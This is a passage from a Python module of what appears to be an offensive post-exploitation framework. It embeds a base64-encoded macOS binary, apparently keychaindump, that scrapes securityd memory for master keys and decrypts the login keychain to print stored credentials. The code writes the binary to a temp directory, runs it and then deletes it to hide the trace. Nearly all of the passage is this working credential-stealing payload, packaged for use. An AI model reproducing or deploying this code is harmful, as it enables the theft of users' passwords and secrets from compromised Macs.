nO/v//JTAyeABbLV0gVG9vIG1hbnkgY2FuZGlkYXRlIGtleXMgdG8gZml0IGluIG1lbW9yeQoAc2VjdXJpdHlkAFstXSBDb3VsZCBub3QgYWxsb2NhdGUgbWVtb3J5IGZvciBrZXkgc2VhcmNoCgBbLV0gUmVxdWVzdGVkICVsdSBieXRlcywgZ290ICVsdSBieXRlcwoAWy1dIEVycm9yICglaSkgcmVhZGluZyB0YXNrIG1lbW9yeSBAICVwCgB2bW1hcCAlaQByAE1BTExPQ19USU5ZICVseC0lbHgAWypdIFNlYXJjaGluZyBwcm9jZXNzICVpIGhlYXAgcmFuZ2UgMHglbHgtMHglbHgKAFstXSBUb28gbWFueSBjcmVkZW50aWFscyB0byBmaXQgaW4gbWVtb3J5CgD63gcRAFstXSBDb3VsZCBub3QgZmluZCBEYkJsb2IKAHNzZ3AASt2iLHnoIQUAa3ljaABbLV0gVGhlIHRhcmdldCBmaWxlIGlzIG5vdCBhIGtleWNoYWluIGZpbGUKAFBhc3N3b3JkcyBub3Qgc2F2ZWQAJXM6JXM6JXMKAFstXSBDb3VsZCBub3QgZmluZCB0aGUgc2VjdXJpdHlkIHByb2Nlc3MKAFstXSBObyByb290IHByaXZpbGVnZXMsIHBsZWFzZSBydW4gd2l0aCBzdWRvCgBbKl0gRm91bmQgJWkgbWFzdGVyIGtleSBjYW5kaWRhdGVzCgAlcy9MaWJyYXJ5L0tleWNoYWlucy9sb2dpbi5rZXljaGFpbgBIT01FACVzAHJiAFstXSBDb3VsZCBub3Qgb3BlbiAlcwoAWypdIFRyeWluZyB0byBkZWNyeXB0IHdyYXBwaW5nIGtleSBpbiAlcwoAWypdIFRyeWluZyBtYXN0ZXIga2V5IGNhbmRpZGF0ZTogJXMKAFsrXSBGb3VuZCBtYXN0ZXIga2V5OiAlcwoAWy1dIE5vbmUgb2YgdGhlIG1hc3RlciBrZXkgY2FuZGlkYXRlcyBzZWVtZWQgdG8gd29yawoAWytdIEZvdW5kIHdyYXBwaW5nIGtleTogJXMKAAABAAAADgAAAAAAAAAAAAAAAQAAABwAAAAAAAAAHAAAAAAAAAAcAAAAAgAAANAQAAA0AAAANAAAAH4qAAAAAAAANAAAAAMAAAAMAAEAEAABAAAAAAAAAAABFAAAAAAAAAADelIAAXgQARAMBwiQAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA8KwAAAQAAAEYrAAABAAAAUCsAAAEAAABaKwAAAQAAAGQrAAABAAAAbisAAAEAAAB4KwAAAQAAAIIrAAABAAAAjCsAAAEAAACWKwAAAQAAAKArAAABAAAAqisAAAEAAAC0KwAAAQAAAL4rAAABAAAAyCsAAAEAAADSKwAAAQAAANwrAAABAAAA5isAAAEAAADwKwAAAQAAAPorAAABAAAABCwAAAEAAAAOLAAAAQAAABgsAAABAAAAIiwAAAEAAAAsLAAAAQAAADYsAAABAAAAQCwAAAEAAABKLAAAAQAAAFQsAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA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AAACMAAAAkAAAAJQAAACYAAAAnAAAAKQAAACoAAAArAAAALAAAAC0AAAAuAAAALwAAADAAAAAxAAAAMgAAADMAAAA0AAAAIABfX09TU3dhcEludDMyAF9fbWhfZXhlY3V0ZV9oZWFkZXIAX2FkZF9tYXN0ZXJfY2FuZGlkYXRlAF9hdG9tMzIAX2NoZWNrXzNkZXNfcGxhaW50ZXh0X3BhZGRpbmcAX2RlY3J5cHRfM2RlcwBfZGVjcnlwdF9jcmVkZW50aWFscwBfZHVtcF9jcmVkZW50aWFsc19kYXRhAF9kdW1wX2tleV9ibG9iAF9kdW1wX2tleWNoYWluAF9kdW1wX3dyYXBwaW5nX2tleQBfZmluZF9vcl9jcmVhdGVfY3JlZGVudGlhbHMAX2dfY3JlZGVudGlhbHMAX2dfY3JlZGVudGlhbHNfY291bnQAX2dfbWFzdGVyX2NhbmRpZGF0ZXMAX2dfbWFzdGVyX2NhbmRpZGF0ZXNfY291bnQAX2dldF9zZWN1cml0eWRfcGlkAF9oZXhfc3RyaW5nAF9tYWluAF9wcmludF9jcmVkZW50aWFscwBfc2VhcmNoX2Zvcl9rZXlzX2luX3Byb2Nlc3MAX3NlYXJjaF9mb3Jfa2V5c19pbl90YXNrX21lbW9yeQBfREVTX2VkZTNfY2JjX2VuY3J5cHQAX0RFU19zZXRfa2V5AF9fX21lbWNweV9jaGsAX19fbWVtc2V0X2NoawBfX19zbnByaW50Zl9jaGsAX19fc3ByaW50Zl9jaGsAX19fc3RhY2tfY2hrX2ZhaWwAX19fc3RhY2tfY2hrX2d1YXJkAF9leGl0AF9mY2xvc2UAX2ZnZXRzAF9mb3BlbgBfZnJlYWQAX2ZyZWUAX2ZzZWVrAF9mdGVsbABfZ2V0ZW52AF9nZXRldWlkAF9tYWNoX3Rhc2tfc2VsZl8AX21hbGxvYwBfbWVtY21wAF9wY2xvc2UAX3BvcGVuAF9wcmludGYAX3Jld2luZABfc3NjYW5mAF9zdHJjbXAAX3N0cm5jbXAAX3N5c2N0bABfdGFza19mb3JfcGlkAF92bV9yZWFkX292ZXJ3cml0ZQBkeWxkX3N0dWJfYmluZGVyAAAAAA=="
f = open("%sdebug", 'wb')
f.write(base64.b64decode(keychaindump))
f.close()
os.popen('chmod a+x %sdebug')
if "%s" != "":
    print(os.popen('%sdebug "%s"').read())
else:
    print(os.popen('%sdebug').read())
os.popen('rm -f %sdebug')
""" % (tempDir, tempDir, keyChain, tempDir, keyChain, tempDir, tempDir)

        moduleName = self.info['Name']
        techniques = self.info['Techniques']
        software = self.info['Software']

        return script, moduleName, techniques, software

